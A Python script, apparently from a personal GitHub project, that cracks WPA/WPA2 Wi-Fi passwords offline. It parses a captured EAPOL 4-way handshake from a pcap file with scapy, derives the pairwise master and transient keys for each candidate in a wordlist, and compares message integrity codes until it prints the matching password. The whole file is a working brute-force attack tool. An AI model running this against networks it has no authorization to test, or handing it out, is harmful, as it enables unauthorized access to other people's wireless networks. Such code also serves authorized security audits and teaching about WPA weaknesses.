#coding: utf-8

"""
Script to find the wifi password from the captured eapol 4-Way handshake
an implementation of the pmkid attack will be make soon
Author: Nicolas
github: https://github.com/nicolas031/
"""

from datetime import datetime

import argparse
import binascii
import hashlib
import hmac
import os
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssid", help="Access point SSID, a wrong SSID will make the whole program useless", required=True)
parser.add_argument("-w", "--wordlist", help="The wordlist for the bruteforce", required=True)
parser.add_argument("-p", "--pcap", help="The pcap where EAPOL authentication is", required=True)
args = parser.parse_args()

def main(ssid, wordlist, pcap):
	
	eapol_message = get_eapol(pcap)
	ap_mac = get_bssid(eapol_message)
	ap_mac = binascii.a2b_hex(ap_mac)

	client_mac = eapol_message["message_1"].addr1.replace(":", "")
	client_mac = binascii.a2b_hex(client_mac)

	aNonce = binascii.hexlify(eapol_message["message_1"][Raw].load)[26:90]
	aNonce = binascii.a2b_hex(aNonce)

	sNonce = binascii.hexlify(eapol_message["message_2"][Raw].load)[26:90]
	sNonce = binascii.a2b_hex(sNonce)

	pke = b"Pairwise key expansion"

	a = input("Press enter to start cracking...\n")
	key_data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(aNonce, sNonce) + max(aNonce, sNonce)

	message_integrity_check = binascii.hexlify(eapol_message["message_2"][Raw].load)[154:186]

	wpa_data = binascii.hexlify(bytes(eapol_message["message_2"][EAPOL]))
	wpa_data = wpa_data.replace(message_integrity_check, b"0" * 32)
	wpa_data = binascii.a2b_hex(wpa_data)

	start_time = datetime.now()

	with open(wordlist, "r") as passwords:

		i = 0
		for password in passwords.readlines():
			password = password.replace("\n", "")
			i += 1

			pairwise_master_key = calc_pmk(ssid, password)

			pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data)

			mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()

			
			if mic[:-8] == message_integrity_check.decode():
				running_time = datetime.now() - start_time

				print("[+] Password found: {} ({} seconds)".format(password, running_time))
				print("[+] Tried {} passwords".format(i))
				break

		else:
			print("[!] Password not found")

def calc_ptk(key, A, B):
	blen = 64
	i = 0
	R = b""

	while i<=((blen*8+159) /160):
		hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
		
		i += 1
		R = R + hmacsha1.digest()

	return R[:blen]

def calc_pmk(ssid, password):
	pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
	return pmk

def get_bssid(eapol_message):
	return eapol_message["message_1"].addr2.replace(":", "")

def get_eapol(pcap):
	packets_list = rdpcap(pcap)

	eapol_message = {}

	for packet in packets_list:
		if packet.haslayer(EAPOL):
			packet_raw = binascii.hexlify(packet[Raw].load)
			if packet_raw[2:6] == "008a".encode(): #message_1
				eapol_message["message_1"] = packet
				
			elif packet_raw[2:6] == "010a".encode(): #message_2
				eapol_message["message_2"] = packet

			elif packet_raw[2:6] == "13ca".encode(): #message_3
				eapol_message["message_3"] = packet

			elif packet_raw[2:6] == "030a".encode(): #message_4
				eapol_message["message_4"] = packet

			if len(eapol_message) == 4:
				return eapol_message

if __name__ == "__main__":

	try:
		print("[+] Importing scapy...", end=" ")
		from scapy.all import *
		print("Done.")
	except ImportError:
		sys.exit("\n[!] Error happened while importing scapy")

	main(args.ssid, args.wordlist, args.pcap)